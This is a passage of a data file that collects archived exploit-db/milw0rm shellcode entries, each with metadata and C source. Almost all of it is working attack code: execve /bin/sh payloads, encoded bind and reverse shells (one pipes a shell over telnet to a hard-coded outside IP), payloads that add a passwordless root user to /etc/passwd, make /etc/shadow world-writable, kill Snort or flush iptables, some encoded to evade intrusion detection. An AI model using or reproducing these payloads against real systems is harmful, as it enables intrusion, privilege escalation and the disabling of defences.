]", "  \"\\xd4\\x23\\xa0\\x4c\"    // st  %o2, [ %sp + 0x4c ]", "  \"\\x90\\x10\\x20\\x03\"    // mov  3, %o0", "  \"\\x92\\x03\\xa0\\x44\"    // add  %sp, 0x44, %o1", "  \"\\x82\\x10\\x20\\xce\"    // mov  0xce, %g1", "  \"\\x91\\xd0\\x20\\x10\"    // ta  0x10", "  \"\\xd0\\x07\\xbf\\xf4\"    // ld  [ %fp + -12 ], %o0", "  \"\\x92\\x1a\\x40\\x09\"    // xor  %o1, %o1, %o1", "  \"\\x82\\x10\\x20\\x5a\"    // mov  0x5a, %g1", "  \"\\x91\\xd0\\x20\\x10\"    // ta  0x10", "  \"\\xd0\\x07\\xbf\\xf4\"    // ld  [ %fp + -12 ], %o0", "  \"\\x92\\x10\\x20\\x01\"    // mov  1, %o1", "  \"\\x82\\x10\\x20\\x5a\"    // mov  0x5a, %g1", "  \"\\x91\\xd0\\x20\\x10\"    // ta  0x10", "  \"\\xd0\\x07\\xbf\\xf4\"    // ld  [ %fp + -12 ], %o0", "  \"\\x92\\x10\\x20\\x02\"    // mov  2, %o1", "  \"\\x82\\x10\\x20\\x5a\"    // mov  0x5a, %g1", "  \"\\x91\\xd0\\x20\\x10\"    // ta  0x10", "  \"\\x2d\\x0b\\xd8\\x9a\"    // sethi  %hi(0x2f626800), %l6", "  \"\\xac\\x15\\xa1\\x6e\"    // or  %l6, 0x16e, %l6", "  \"\\x2f\\x0b\\xdc\\xda\"    // sethi  %hi(0x2f736800), %l7", "  \"\\x90\\x0b\\x80\\x0e\"    // and  %sp, %sp, %o0", "  \"\\x92\\x03\\xa0\\x08\"    // add  %sp, 8, %o1", "  \"\\xa6\\x10\\x20\\x01\"    // mov  1, %l3", "  \"\\x94\\x24\\xe0\\x01\"    // sub  %l3, 1, %o2", "  \"\\x9c\\x03\\xa0\\x10\"    // add  %sp, 0x10, %sp", "  \"\\xec\\x3b\\xbf\\xf0\"    // std  %l6, [ %sp + -16 ]", "  \"\\xd0\\x23\\xbf\\xf8\"    // st  %o0, [ %sp + -8 ]", "  \"\\xc0\\x23\\xbf\\xfc\"    // clr  [ %sp + -4 ]", "  \"\\x82\\x10\\x20\\x3b\"    // mov  0x3b, %g1", "  \"\\x91\\xd0\\x20\\x10\";   // ta  0x10", "", "int", "main()", "{", "  int (*test)();", "  test = (int (*)()) cb_linux_sparc;", "  printf(\"%s shellcode\\n\\tSize = %d\\n\",NAME,strlen(cb_linux_sparc));", "  (int)(*test)();", "  exit(0);", "}", "", "/*******************************************************************************", "", " here it is the C code, that will give you the IPv4 Address of your ", " box, in a big-endianess style, so to replace it inside shellcode and", " get the whole thing working for you.", "", " example:", "  int main() { printf(\" 0x%02x%02x%02x%02x\\n\",192,168,100,1); exit(0); }", "  or @ bash     printf \"0x%02x%02x%02x%02x\\n\" 192 168 100 1", "", " i believe no further explanation needed.", "", "********************************************************************************/", "", "//EOF", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Linux/x86 - execve(/bin/sh) + Alphanumeric Shellcode (392 bytes)", "Author": "RaiSe", "Published": ": 2004-09-26", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13424.c", "View": "https://old.exploit-db.com/raw/13424/", "code": ["/*", " *  Linux/x86", " *", " *  execve() of /bin/sh", " *  you can put 0-200 nops before shellcode", " *  nop = 0x47 = 'G'", " * ", " */", "", "", "char shellc[] = ", "// nops here ..", "\"LLLLXPY3E01E01u03u0fXh8eshXf5VJPfhbifhDefXf5AJfPDTYhKATYX5KATY\"", "\"PQTUX3H01H01X03X0YRX3E01E03U0Jfh2GfXf3E0f1E0f1U0fh88fX0E1f1E0f\"", "\"3E0fPTRX49HHHQfPfYRX2E00E0BRX0E02E02L0z0L0zYRX4j4aGGGGGGGGGGGGG\"", "\"GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG\"", "\"GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG\"", "\"GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG\"", "\"GGGGGGGGGGGGGGGG\"; ", "", "", "/*", "RaiSe <raise@netsearch-ezine.com>", "http://www.netsearch-ezine.com", "*/", "", "# milw0rm.com [2004-09-26]"]},
{"Title": "Linux/IA32 - execve(/bin/sh) + 0xff-Free Shellcode (45 bytes)", "Author": "anathema", "Published": ": 2004-09-26", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13425.c", "View": "https://old.exploit-db.com/raw/13425/", "code": ["/*", "", "  0xff-less execve() /bin/sh by anathema <anathema@hack.co.za>", "", "*/", "", "#include <stdio.h>", "#include <stdlib.h>", "", "unsigned char code[] = ", "", "/* Linux/IA32 0xff-less execve() shellcode.  */", "", "\"\\x89\\xe6\"                          /* movl %esp, %esi          */", "\"\\x83\\xc6\\x30\"                      /* addl $0x30, %esi         */", "\"\\xb8\\x2e\\x62\\x69\\x6e\"              /* movl $0x6e69622e, %eax   */", "\"\\x40\"                              /* incl %eax                */", "\"\\x89\\x06\"                          /* movl %eax, (%esi)        */", "\"\\xb8\\x2e\\x73\\x68\\x21\"              /* movl $0x2168732e, %eax   */", "\"\\x40\"                              /* incl %eax                */", "\"\\x89\\x46\\x04\"                      /* movl %eax, 0x04(%esi)    */", "\"\\x29\\xc0\"                          /* subl %eax, %eax          */", "\"\\x88\\x46\\x07\"                      /* movb %al, 0x07(%esi)     */", "\"\\x89\\x76\\x08\"                      /* movl %esi, 0x08(%esi)    */", "\"\\x89\\x46\\x0c\"                      /* movl %eax, 0x0c(%esi)    */", "\"\\xb0\\x0b\"                          /* movb $0x0b, %al          */", "\"\\x87\\xf3\"                          /* xchgl %esi, %ebx         */", "\"\\x8d\\x4b\\x08\"                      /* leal 0x08(%ebx), %ecx    */", "\"\\x8d\\x53\\x0c\"                      /* leal 0x0c(%ebx), %edx    */", "\"\\xcd\\x80\"                          /* int $0x80                */", ";", "", "void main()", "{", "  void (*s)() = (void *)code;", "", "  printf(\"Shellcode length: %d\\nExecuting..\\n\\n\",", "      strlen(code));", "  s();", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "BSD/x86 - symlink /bin/sh + XORing Encoded Shellcode (56 bytes)", "Author": "dev0id", "Published": ": 2004-09-26", "Platform": "BSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-53.php", "View": null, "code": ["/*The shellcode calls the symlink() and makes the ", " link to the /bin/sh in the current dir.", "\tshort version with anti IDS xoring", " size = 56 bytes", " OS   = *BSD", " \twritten by /rootteam/dev0id (www.sysworld.net)", "\t\t\t\tdev0id@uncompiled.com", "BITS 32", "jmp short\tcallme", "main:", "\tpop\tesi", "\txor\tecx,ecx", "\tmov\tcl,32", "main_loop:", "\txor byte\t[esi+ecx],0x0f", "\tloop\tmain_loop", "\txor byte\t[esi+ecx],0x0f", "\tpush\tesi", "\tret\t", "callme:", "xored_shellcode:", "\tcall\tmain", "\tdb 0xe4,0x1d,0x51,0x3e,0xcf,0x87,0x49,0x08,0x82,0x51,0x0a,0x5c,0x82,0x11,0x5c", "\tdb 0xbf,0x36,0x5f,0xc2,0x8f,0xe7,0xe6,0xf0,0xf0,0xf0,0x20,0x6d,0x66,0x61,0x20", "\tdb 0x7c,0x67", "\t", "*/", "", "char shellcode[] =", "\t\"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x20\\x80\\x34\\x0e\\x0f\\xe2\\xfa\\x80\\x34\"", "\t\"\\x0e\\x0f\\x56\\xc3\\xe8\\xea\\xff\\xff\\xff\\xe4\\x1d\\x51\\x3e\\xcf\\x87\"", "\t\"\\x49\\x08\\x82\\x51\\x0a\\x5c\\x82\\x11\\x5c\\xbf\\x36\\x5f\\xc2\\x8f\\xe7\"", "\t\"\\xe6\\xf0\\xf0\\xf0\\x20\\x6d\\x66\\x61\\x20\\x7c\\x67\";", "", "int", "main (void)", "{", "\tvoid (*code)(void);", "\tcode=(void(*)())shellcode;", "\t(void)code();", "\treturn 0;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Linux/x86 - Bind (5074/TCP) Shell + ToUpper Encoded Shellcode (226 bytes)", "Author": "Tora", "Published": ": 2004-09-26", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-370.php", "View": null, "code": ["/*", " * Bindshell puerto 5074 (TOUPPER EVASION)", " * 226 bytes", " * Bindshell original: Matias Sedalo (92 bytes)", " *", " * La binshell esta codificada usando 2 bytes para", " * representar 1 byte original de la siguiente forma:", " * byte original: 0xAB", " * 0x41 + 0xA = 0x4B; 0x41 + 0xB = 0x4C", " * byte codificado: [0x4B 0x4C]", " *", " * by Tora", " */", "", "#include <stdio.h>", "#include <ctype.h>", "", "char shellcode[] = ", "/* _start */", "\"\\xeb\\x02\"\t\t\t/* jmp short A          */", "", "/* A */", "\"\\xeb\\x05\"\t\t\t/* jmp short C          */", "", "/* B */", "\"\\xe8\\xf9\\xff\\xff\\xff\"\t\t/* call A               */", "", "/* C */", "\"\\x5f\"\t\t\t\t/* pop edi              */", "\"\\x81\\xef\\xdf\\xff\\xff\\xff\"\t/* sub edi, 0xffffffdf  */", "\"\\x57\"\t\t\t\t/* push edi             */", "\"\\x5e\"\t\t\t\t/* pop esi              */", "\"\\x29\\xc9\"\t\t\t/* sub ecx, ecx         */", "\"\\x80\\xc1\\xb8\"\t\t\t/* add cl, 0xb8         */", "", "/* bucle */", "\"\\x8a\\x07\"\t\t\t/* mov al, byte [edi]   */", "\"\\x2c\\x41\"\t\t\t/* sub al, 0x41         */", "\"\\xc0\\xe0\\x04\"\t\t\t/* shl al, 4            */", "\"\\x47\"\t\t\t\t/* inc edi              */", "\"\\x02\\x07\"\t\t\t/* add al, byte [edi]   */", "\"\\x2c\\x41\"\t\t\t/* sub al, 0x41         */", "\"\\x88\\x06\"\t\t\t/* mov byte [esi], al   */", "\"\\x46\"\t\t\t\t/* inc esi              */", "\"\\x47\"\t\t\t\t/* inc edi              */", "\"\\x49\"\t\t\t\t/* dec ecx              */", "\"\\xe2\\xed\"\t\t\t/* loop bucle           */", "/* Shellcode codificada de 184 (0xb8) bytes */", "\"DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKB\"", "\"AFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIA\"", "\"JDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJO\"", "\"BLAALMNIA\";", "", "int main(void)", "{", "    int *ret;", "    char *t;", "", "    for (t = shellcode; *t; t++)", "        if (islower(*t))", "            *t = toupper(*t);", "\t", "    ret=(int *)&ret +3;", "    printf(\"Shellcode lenght=%d\\n\",strlen(shellcode));", "    (*ret) = (int)shellcode;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Linux/x86 - Add Root User (t00r) To /etc/passwd + Anti-IDS Shellcode (116 bytes)", "Author": "Matias Sedalo", "Published": ": 2004-09-26", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-353.php", "View": null, "code": ["/*", " * !!!!!! ANTI IDS SHELLCODE !!!!!!", " *", " * s0t4ipv6@shellcode.com.ar", " * 0x14abril0x7d2", " *", " * !!!!! ENCRIPTADA !!!!!", "", " * 116 bytes\t", " * Agrega la linea \"t00r::0:0::/:/bin/sh\" en /etc/passwd", "", " * !!!!! ENCRIPTADA !!!!!", " *", " * Para mas informacion", " * Descargue http://www.shellcode.com.ar/Projects/JempiScodes(version).tgz", " *", " * !!!!!! ANTI IDS SHELLCODE !!!!!!", "*/", "", "#include <stdio.h>", "", "char shellcode[]=", "\"\\xeb\\x1b\\x5f\\x31\\xc0\\x6a\\x28\\x6a\\x52\\x59\\x49\\x5b\\x8a\\x04\\x0f\"", "\"\\xf6\\xd3\\x30\\xd8\\x88\\x04\\x0f\\x50\\x85\\xc9\\x75\\xef\\xeb\\x05\\xe8\"", "\"\\xe0\\xff\\xff\\xff\\x0e\\x6f\\xc7\\xe4\\xff\\xfb\\xec\\xf3\\xf4\\xb3\\xa0\"", "\"\\xee\\xf6\\xb8\\xff\\xb5\\xee\\x02\\x95\\x91\\x3a\\xb5\\x70\\x32\\xba\\x37\"", "\"\\xb2\\xf6\\xb5\\xbb\\xb2\\x04\\x07\\x86\\x5c\\x21\\xb2\\x2e\\xc6\\xf9\\xbe\"", "\"\\xa3\\xe4\\xff\\xad\\xea\\xb2\\xf4\\xfe\\xa7\\xf5\\xff\\xea\\xb8\\xad\\xff\"", "\"\\xf5\\xf5\\xad\\xe3\\xbb\\xff\\xbd\\x3f\\x59\\x66\\x33\\xba\\x72\\x97\\xd3\"", "\"\\xb2\\x4e\\x0e\\x8f\\x49\\x34\\xb2\\x3f\\x72\\xb2\\x57\";", "", "main() {", "        int *ret;", "        ret=(int *)&ret+2;", "        printf(\"Shellcode lenght=%d\\n\",strlen(shellcode));", "        (*ret) = (int)shellcode;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Linux/x86 - chmod 666 /etc/shadow + Anti-IDS Shellcode (75 bytes)", "Author": "Matias Sedalo", "Published": ": 2004-09-26", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-354.php", "View": null, "code": ["/*", " * !!!!!! ANTI IDS SHELLCODE !!!!!!", " *", " * s0t4ipv6@shellcode.com.ar", " * 0x17abril0x7d2", " *", " * !!!!! ENCRIPTADA !!!!!", "", " * 75 bytes", " * chmod 666 /etc/shadow", "", " * !!!!! ENCRIPTADA !!!!!", " *", " * Para mas informacion", " * Descargue http://www.shellcode.com.ar/Projects/JempiScodes(version).tgz", " *", " * !!!!!! ANTI IDS SHELLCODE !!!!!!", "*/", "", "#include <stdio.h>", "", "char shellcode[]=", "\"\\xeb\\x1b\\x5f\\x31\\xc0\\x6a\\x53\\x6a\\x29\\x59\\x49\\x5b\\x8a\\x04\\x0f\"", "\"\\xf6\\xd3\\x30\\xd8\\x88\\x04\\x0f\\x50\\x85\\xc9\\x75\\xef\\xeb\\x05\\xe8\"", "\"\\xe0\\xff\\xff\\xff\\x03\\xb6\\x90\\x07\\xbe\\x39\\xba\\x79\\x6c\\x87\\x20\"", "\"\\xf0\\x48\\xcf\\x0e\\x8f\\x40\\x3d\\xb2\\x4e\\x0e\\x7f\\x72\\xb2\\x97\\xf3\"", "\"\\xe4\\xff\\xff\\x2f\\xb5\\xee\\xe8\\xb3\\xa3\\xe4\\xf6\\xfa\\xf4\\xe7\\xdb\";", "", "void main() {", "        int *ret;", "        ret = (int *)&ret +2;", "        printf(\"Shellcode lenght=%d\\n\",strlen(shellcode));", "        (*ret) =(int)shellcode;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "BSD/x86 - symlink . /bin/sh Shellcode (32 bytes)", "Author": "dev0id", "Published": ": 2004-09-26", "Platform": "BSD_x86", "Download": "http://rootteam.void.ru/shellcodes/link_short.c", "View": null, "code": ["/*The shellcode calls the symlink() and makes the ", " link to the /bin/sh in the current dir.", "\tshort version", " size = 32 bytes", " OS   = *BSD", " \twritten by /rootteam/dev0id (www.sysworld.net)", "\t\t\t\tdev0id@uncompiled.com\t", "\t", "BITS 32", "jmp short\tcallme", "main:", "\tpop\tesi", "\txor\teax,eax", "\tmov byte [esi+7],al", "\tlea\tebx,[esi+5]", "\tpush\tebx", "\tlea\tebx,[esi]", "\tpush\tebx", "\tmov\tal,57", "\tpush\teax", "\tint\t0x80", "\t", "callme:", "\tcall\tmain", "\tdb\t'/bin/sh'", "*/", "", "char shellcode[] =", "\t\"\\xeb\\x12\\x5e\\x31\\xc0\\x88\\x46\\x07\\x8d\\x5e\\x05\\x53\\x8d\\x1e\\x53\"", "\t\"\\xb0\\x39\\x50\\xcd\\x80\\xe8\\xe9\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\"", "\t\"\\x73\\x68\";", "", "int", "main (void)", "{", "\tvoid (*code)(void);", "\tcode=(void(*)())shellcode;", "\t(void)code();", "\treturn 0;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Linux/x86 - Kill Snort Shellcode (151 bytes)", "Author": "nob0dy", "Published": ": 2004-09-26", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-52.php", "View": null, "code": ["/*", " * x86 linux \"snort IDS\" shutter shellcode", " * size 151", " *", " * By nob0dy // find your own reality /", " *", " */", "", "char snort_shutter_shellcode[] =", " \"\\xeb\\x03\\x5e\\xeb\\x05\\xe8\\xf8\\xff\\xff\"", " \"\\xff\\x83\\xc6\\x0d\\x31\\xc9\\xb1\\x80\\x80\"", " \"\\x36\\x01\\x46\\xe2\\xfa\\xea\\x18\\x2e\\x74\"", " \"\\x72\\x73\\x2e\\x63\\x68\\x6f\\x2e\\x71\\x6a\"", " \"\\x68\\x6d\\x6d\\x01\\x2c\\x31\\x38\\x01\\x72\"", " \"\\x6f\\x6e\\x73\\x75\\x01\\x80\\xed\\x66\\x2a\"", " \"\\x01\\x01\\xea\\x0c\\x91\\x91\\x91\\x91\\x91\"", " \"\\x91\\x91\\x91\\x91\\x91\\x91\\x91\\x91\\x54\"", " \"\\x88\\xe4\\x57\\x52\\x82\\xed\\x11\\xe9\\x01\"", " \"\\x01\\x01\\x01\\x5a\\x80\\xc2\\xca\\x11\\x01\"", " \"\\x01\\x30\\xd3\\xc6\\x44\\xf5\\x01\\x01\\x01\"", " \"\\x01\\x8c\\x82\\x08\\xee\\xfe\\xfe\\x8c\\xb2\"", " \"\\xfb\\xef\\xfe\\xfe\\x88\\x44\\xed\\x8c\\x82\"", " \"\\x0c\\xee\\xfe\\xfe\\x88\\x44\\xf1\\xb9\\x0a\"", " \"\\x01\\x01\\x01\\x88\\x74\\xe9\\x8c\\x4c\\xe9\"", " \"\\x52\\x88\\xf2\\xcc\\x81\\x82\\xc5\\x11\\x5a\"", " \"\\x5f\\x5c\\xc2\\x91\\x91\\x91\\x91\";", "", "int main()", "{", " void(* shutdown_snort)() = (void *)snort_shutter_shellcode ;", " shutdown_snort() ;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Linux/x86 - Execute At Shared Memory Shellcode (50 bytes)", "Author": "sloth", "Published": ": 2004-09-26", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-369.php", "View": null, "code": ["/* sloth@nopninjas.com - http://www.nopninjas.com", "", "   Platform: Linux x86", "   Length: 50 bytes", "     ", "   - This shellcode connects to the shared memory segment matching the key", "     and executes the code at that address. ", "", "        xorl    %edi,%edi", "        xorl    %esi,%esi", "        xorl    %edx,%edx", "        movl    $0xdeadbeef,%ecx       * shared memory key *", "        xorl    %ebx,%ebx", "        movb    $23,%bl", "        xorl    %eax,%eax", "        movb    $117,%al", "        int     $0x80", "", "        xorl    %edi,%edi", "        movl    $0xbffffffa,%esi       * pointer storage location *", "        xorl    %edx,%edx", "        movl    %eax,%ecx", "        xorl    %ebx,%ebx", "        movb    $21,%bl", "        xorl    %eax,%eax", "        movb    $117,%al", "        int     $0x80", "", "        movl    $0xbffffffa,%eax       * pointer storage location *", "        pushl   (%eax)", "        ret", "", "*/", "", "char shm[] = \"\\x31\\xff\\x31\\xf6\\x31\\xd2\\xb9\\xef\\xbe\\xad\\xde\\x31\\xdb\\xb3\\x17\\x31\"", "             \"\\xc0\\xb0\\x75\\xcd\\x80\\x31\\xff\\xbe\\xfa\\xff\\xff\\xbf\\x31\\xd2\\x89\\xc1\"", "             \"\\x31\\xdb\\xb3\\x15\\x31\\xc0\\xb0\\x75\\xcd\\x80\\xb8\\xfa\\xff\\xff\\xbf\\xff\"", "             \"\\x30\\xc3\";", "              ", "int main() {", "  void (*shell)() = (void *)&shm;", "  shell();", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Linux/x86 - Flush IPTables Rules (/sbin/iptables -F) Shellcode (45 bytes)", "Author": "UnboundeD", "Published": ": 2004-09-26", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-368.php", "View": null, "code": ["/*", " * 06/03/2003 ", " * ", " * ( 45 bytes ) to flush iptables.", " *", " * _execve(/sbin/iptables -F)  by UnboundeD", " * greetz to s0t4ipv6.", " *", " */", "", "char shellcode[] =", "", "\"\\x31\\xd2\"                      // xorl         %edx,%edx", "\"\\x52\"                          // pushl        %edx", "\"\\x66\\x68\\x2d\\x46\"              // pushw        $0x462d", "\"\\x89\\xe6\"                      // movl         %esp,%esi", "\"\\x52\"                          // pushl        %edx", "\"\\x68\\x62\\x6c\\x65\\x73\"          // pushl        $0x73656c62", "\"\\x68\\x69\\x70\\x74\\x61\"          // pushl        $0x61747069", "\"\\x89\\xe7\"                      // movl         %esp,%edi", "\"\\x68\\x62\\x69\\x6e\\x2f\"          // pushl        $0x2f6e6962", "\"\\x68\\x2f\\x2f\\x2f\\x73\"          // pushl        $0x732f2f2f", "\"\\x89\\xe3\"                      // movl         %esp,%ebx", "\"\\x52\"                          // pushl        %edx", "\"\\x56\"                          // pushl        %esi", "\"\\x57\"                          // pushl        %edi", "\"\\x89\\xe1\"                      // movl         %esp,%ecx", "\"\\x31\\xc0\"                      // xorl         %eax,%eax", "\"\\xb0\\x0b\"                      // movb         $0xb,%al", "\"\\xcd\\x80\"                      // int          $0x80", ";", "", "main() {", "        int *ret;", "        ret=(int *)&ret +2;", "        printf(\"Shellcode lenght=%d\\n\",strlen(shellcode));", "        (*ret) = (int)shellcode;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Linux/x86 - Flush IPTables Rules (/sbin/iptables -F) Shellcode (58 bytes)", "Author": "dev0id", "Published": ": 2004-09-26", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-361.php", "View": null, "code": ["/* The shellcode flushs the iptables  by running /sbin/iptables -F", "   no exit()", "   greetz to zilion: man, my code is shorter!", "", "   size = 58 bytes ", "   OS\t= Linux i386", " \t\twritten by /rootteam/dev0id (www.sysworld.net)", " ", "", "BITS\t32", "", "jmp\tshort\tcallme", "main:", "\tpop\tesi", "\txor\teax,eax", "\tmov byte [esi+14],al", "\tmov byte [esi+17],al", "\tmov long [esi+18],esi", "\tlea\t ebx,[esi+15]", "\tmov long [esi+22],ebx", "\tmov long [esi+26],eax", "\tmov \tal,0x0b", "\tmov\tebx,esi", "\tlea\tecx,[esi+18]", "\tlea\tedx,[esi+26]", "\tint\t0x80", "\t", "", "callme:", "\tcall\tmain", "\tdb '/sbin/iptables#-F#'", "*/", "", "", "char shellcode[] =", "\t\"\\xeb\\x21\\x5e\\x31\\xc0\\x88\\x46\\x0e\\x88\\x46\\x11\\x89\\x76\\x12\\x8d\"", "\t\"\\x5e\\x0f\\x89\\x5e\\x16\\x89\\x46\\x1a\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x12\"", "\t\"\\x8d\\x56\\x1a\\xcd\\x80\\xe8\\xda\\xff\\xff\\xff\\x2f\\x73\\x62\\x69\\x6e\"", "\t\"\\x2f\\x69\\x70\\x74\\x61\\x62\\x6c\\x65\\x73\\x23\\x2d\\x46\\x23\";", "", "\t", "int main()", "{", "", "  int *ret;", "  ret = (int *)&ret + 2;", "  (*ret) = (int)shellcode;", "}", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Linux/x86 - Reverse (200.182.207.235/TCP) Telnet Shel Shellcode (134 bytes)", "Author": "hts", "Published": ": 2004-09-26", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-367.php", "View": null, "code": ["/*", "   Reverse Telnet Shellcode by hts", "*/", "/*", "        jmp   0x31", "        popl  %esi", "        movl  %esi,0x4f(%esi)", "        leal  0x8(%esi),%ebx", "        movl  %ebx,0x53(%esi)", "        leal  0xb(%esi),%ebx", "        movl  %ebx,0x57(%esi)", "        xorl  %eax,%eax", "        movb  %eax,0x7(%esi)", "        movb  %eax,0xa(%esi)", "        movb  %eax,0x4e(%esi)", "        movl  %eax,0x5b(%esi)", "        movb  $0xb,%al", "        movl  %esi,%ebx", "        leal  0x4f(%esi),%ecx", "        leal  0x5b(%esi),%edx", "        int   $0x80", "        xorl  %ebx,%ebx", "        movl  %ebx,%eax", "        inc   %eax", "        int   $0x80", "        call  -0x36", "        .string \\\"/bin/sh -c /bin/telnet 200.182.207.235 5|/bin/sh|/bin/telnet 200.182.207.235 6\\\"", "*/", "", "char shellcode[] =", "        \"\\xeb\\x31\\x5e\\x89\\x76\\x4f\\x8d\\x5e\\x08\\x89\\x5e\\x53\"", "        \"\\x8d\\x5e\\x0b\\x89\\x5e\\x57\\x31\\xc0\\x88\\x46\\x07\\x88\"", "        \"\\x46\\x0a\\x88\\x46\\x4e\\x89\\x46\\x5b\\xb0\\x0b\\x89\\xf3\"", "        \"\\x8d\\x4e\\x4f\\x8d\\x56\\x5b\\xcd\\x80\\x31\\xdb\\x89\\xd8\"", "        \"\\x40\\xcd\\x80\\xe8\\xca\\xff\\xff\\xff/bin/sh -c /bin/\"", "        \"telnet 200.182.207.246 5|/bin/sh|/bin/telnet 200\"", "        \".182.207.246 6\";", "", "#define NAME \"Reverse Telnet Shellcode - by hts\"", "", "void main(){", "  void (*s)() = (void *)hellcode;", "  printf(\"Shellcode length: %d\\nExecuting..\\n\\n\", strlen(hellcode));", "  s();", "}", "", "/* I don't know if exists any reverse telnet shellcode..", " * you should modify your ip addr to use it...", " * to use it, nc -l -p 5 , on another terminal nc -l -p 6", " * then run the shellcode with your ip addr or just 127.000.000.001", "*/", "", "// milw0rm.com [2004-09-26]"]},
{"Title": "Linux/x86 - Reverse (/TCP) Shell (/bin/sh) Shellcode (120 bytes)", "Author": "lamagra", "Published": ": 2004-09-26", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13436.c", "View": "https://old.exploit-db.com/raw/13436/", "code": ["/*", "Connecting shellcode written by lamagra <lamagra@digibel.org>", "http://lamagra.seKure.de", "", "May 2000", "", ".file\t\"connect\"", ".version\t\"01.01\"", ".text", "\t.align 4", "_start:", "\t#socket(AF_INET,SOCK_STREAM,IPPROTO_IP);", "\tmovl %esp,%ebp", "\txorl %edx,%edx", "\tmovb $102,%edx", "\tmovl %edx,%eax\t\t# 102 = socketcall", "\txorl %ecx,%ecx", "\tmovl %ecx,%ebx", "\tincl %ebx\t \t\t# socket()", "\tmovl %ebx, -8(%ebp)\t# 1 = SOCK_STREAM", "\tincl %ebx", "\tmovl %ebx, -12(%ebp)\t# 2 = AF_INET", "\tdecl %ebx\t\t\t# 1 = SYS_socket", "\tmovl %ecx, -4(%ebp)\t# 0 = IPPROTO_IP ", "\tleal -12(%ebp),%ecx\t# put args in correct place", "\tint  $0x80\t\t\t# switch to kernel-mode", "\txorl %ecx,%ecx", "\tmovl %eax,-12(%ebp)\t# save the fd", "", "\t# connect(fd,(struct sockaddr *)&struct,16);", "\tincl %ebx", "\tmovw %ebx,-20(%ebp)\t# 2 = PF_INET", "\tmovw $9999,-18(%ebp)\t# 9999 = htons(3879);", "\tmovl $0x100007f,-16(%ebp) # htonl(IP) ", "\tleal -20(%ebp),%eax\t# struct sockaddr", "\tmovl %eax,-8(%ebp)\t# load the struct", "\tmovb $16,-4(%ebp)\t\t# 16 = sizeof(sockaddr)", "\tmovl %edx,%eax\t\t# 102 = socketcall", "\tincl %ebx\t\t\t# 3 = SYS_connect", "\tleal -12(%ebp),%ecx\t# put args in place", "\tint  $0x80\t\t\t# call socketcall()", "", "\t# dup2(fd,0-1-2)", "\txorl %ecx,%ecx", "\tmovb $63,%eax\t\t# 63 = dup2()", "\tint  $0x80", "        incl %ecx", "        cmpl $3,%ecx", "        jne  -0xa", "", "\t# arg[0] = \"/bin/sh\"", "\t# arg[1] = 0x0", "\t# execve(arg[0],arg);", "\tjmp  0x18", "\tpopl %esi", "\tmovl %esi,0x8(%ebp)", "\txorl %eax,%eax", "\tmovb %eax,0x7(%esi)", "\tmovl %eax,0xc(%ebp)", "\tmovb $0xb,%al", "\tmovl %esi,%ebx", "\tleal 0x8(%ebp),%ecx\t", "\tleal 0xc(%ebp),%edx\t", "\tint  $0x80\t", "\tcall -0x1d", "\t.string \"/bin/sh\"", "*/", "", "#define NAME \"connecting\"", "", "char code[]=", "\"\\x89\\xe5\\x31\\xd2\\xb2\\x66\\x89\\xd0\\x31\\xc9\\x89\\xcb\\x43\\x89\\x5d\\xf8\"", "\"\\x43\\x89\\x5d\\xf4\\x4b\\x89\\x4d\\xfc\\x8d\\x4d\\xf4\\xcd\\x80\\x31\\xc9\\x89\"", "\"\\x45\\xf4\\x43\\x66\\x89\\x5d\\xec\\x66\\xc7\\x45\\xee\\x0f\\x27\\xc7\\x45\\xf0\"", "\"\\x7f\\x01\\x01\\x01\\x8d\\x45\\xec\\x89\\x45\\xf8\\xc6\\x45\\xfc\\x10\\x89\\xd0\"", "\"\\x43\\x8d\\x4d\\xf4\\xcd\\x80\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\x41\\x83\\xf9\\x03\"", "\"\\x75\\xf6\\xeb\\x18\\x5e\\x89\\x75\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x45\\x0c\"", "\"\\xb0\\x0b\\x89\\xf3\\x8d\\x4d\\x08\\x8d\\x55\\x0c\\xcd\\x80\\xe8\\xe3\\xff\\xff\"", "\"\\xff/bin/sh\";", "", "", "main()", "{", "  int (*funct)();", "  funct = (int (*)()) code;", "  printf(\"%s shellcode\\n\\tSize = %d\\n\",NAME,strlen(code));", "  (int)(*funct)();", "}", "", "// milw0rm.com 